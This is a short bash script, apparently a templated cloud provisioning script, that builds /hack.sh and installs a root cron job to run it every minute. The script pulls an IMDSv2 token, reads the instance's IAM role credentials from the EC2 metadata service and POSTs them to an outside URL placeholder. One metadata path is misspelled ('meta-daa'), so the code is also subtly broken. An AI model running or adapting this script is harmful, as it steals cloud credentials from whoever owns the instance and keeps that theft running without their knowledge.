#! /bin/bash
sudo apt-get update
sudo apt-get install -y curl

echo '#! /bin/bash' >> /hack.sh
echo 'TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`' >> /hack.sh
echo 'curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-daa/iam/security-credentials/${iam_role} > data.json' >> /hack.sh
echo 'curl -X POST -d @data.json  ${url}' >> /hack.sh

echo '* * * * * root bash /hack.sh' >> /etc/crontab && echo "" >> /etc/crontab
